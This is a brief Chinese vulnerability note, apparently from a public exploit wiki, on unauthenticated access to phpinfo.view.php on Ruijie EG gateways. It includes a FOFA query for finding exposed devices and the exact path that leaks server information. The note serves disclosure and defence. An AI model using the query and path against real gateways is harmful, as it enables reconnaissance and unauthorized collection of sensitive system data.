---
title: 锐捷EG易网关 phpinfo.view.php 信息泄露漏洞
date: 2021-09-23 23:55:51
tags: PeiQi文库
categories:
 - 网络设备漏洞
 - 锐捷
---

# 锐捷EG易网关 phpinfo.view.php 信息泄露漏洞

## 漏洞描述

锐捷EG易网关 部分版本 phpinfo.view.php文件权限设定存在问题，导致未经身份验证获取敏感信息

## 漏洞影响

> [!NOTE]
>
> 锐捷EG易网关

## FOFA

> [!NOTE]
>
> app="Ruijie-EG易网关"

## 漏洞复现

查看源码发现phpinfo文件 

![](/img/20210924013726338814.png)

访问 url

```
/tool/view/phpinfo.view.php
```

![](/img/20210924013726709665.png)